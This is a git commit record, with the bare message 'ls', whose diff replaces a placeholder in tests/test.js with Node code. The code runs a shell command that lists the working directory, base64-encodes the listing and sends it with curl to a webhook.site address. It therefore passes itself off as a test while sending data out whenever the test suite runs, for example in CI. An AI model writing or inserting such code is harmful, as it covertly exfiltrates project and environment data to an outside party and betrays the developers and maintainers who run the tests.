9d1f52441243e0bbbee013a8286aee880c9dceb5
RashestLight <terrelldixon02@yahoo.com>
2023-04-14 21:55:46 -0400

    ls

--- tests/test.js
+++ tests/test.js
@@ -1,2 +1,14 @@
-// TODO: implement the tests
-console.log("Tests are not implemented yet...");
+
+
+
+const { exec } = require('node:child_process')
+
+
+exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(ls -al | base64)' , (err, output) => {
+    if (err) {
+        console.error("could not execute command: ", err)
+        return
+    }
+    // log the output received from the command
+    console.log("Output: \n", output)
+})
